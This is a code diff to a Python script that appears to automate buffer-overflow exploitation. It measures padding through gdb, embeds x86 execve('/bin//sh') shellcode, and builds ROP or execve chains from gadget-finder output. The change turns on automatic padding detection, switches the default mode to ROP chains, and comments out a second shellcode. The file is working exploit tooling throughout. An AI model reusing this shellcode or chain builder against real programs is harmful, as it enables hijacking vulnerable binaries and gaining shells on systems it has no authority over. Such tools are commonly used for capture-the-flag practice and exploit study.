@@ -20,13 +20,13 @@ def main():
 
     binary = args.binary[0]
 
-    buffer = 44 #gdb.get_padding_gdb(binary)
-    #print("Found padding length of " + str(buffer))
+    buffer = gdb.get_padding_gdb(binary)
+    print("Found padding length of " + str(buffer))
 
-    sc_mode = True
+    sc_mode = False
 
     shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
-    shellcode = b"\x6a\x19\x58\x99\x52\x89\xe3\xcd\x80\x40\xcd\x80"
+    #shellcode = b"\x6a\x19\x58\x99\x52\x89\xe3\xcd\x80\x40\xcd\x80"
     sc = ShellcodeCompiler(shellcode)
     sc.setup()
 
@@ -46,13 +46,14 @@ def main():
         sc.execve_builder = eb
         with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
             output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
-            sc.start(output_stream)
+            sc.start(output_stream, buffer)
+
+        sc.write_chain()
 
     else:
         with subprocess.Popen(command_rg, stdout=subprocess.PIPE) as process:
             output_stream = io.TextIOWrapper(process.stdout, newline='\n', encoding='utf-8')
             eb.build_chain(output_stream, args.c.split(' ')[0], args.c.split(' ')[1:], buffer)
-            #eb.build_chain(output_stream, shellcode, buffer)
 
         eb.write_chain()
 
